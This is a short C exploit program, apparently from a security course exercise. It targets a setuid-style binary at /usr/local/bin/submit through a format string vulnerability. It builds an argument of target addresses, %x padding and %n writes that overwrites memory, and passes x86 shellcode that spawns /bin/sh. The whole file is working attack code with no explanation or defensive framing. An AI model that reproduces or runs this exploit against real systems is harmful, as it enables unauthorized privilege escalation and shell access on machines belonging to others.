#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>

#define TARGET "/usr/local/bin/submit"

static char shellcode[] =
  "\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";


int main()
{

  char *args[4];
  char *env[1];

	char exploit[] = "\x3c\xdd\xbf\xff\x55\x66\x77\x88\x3e\xdd\xbf\xff\x55\x66\x77\x88 %56718d %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %n %8201d %n \n";

		args[0] = TARGET; args[1] = exploit; 
		args[2] = shellcode; args[3] = NULL;

	 	env[0] = NULL;

		if (execve(TARGET, args, env) < 0)
				fprintf(stderr, "execve failed.\n");

		exit(0);

	}

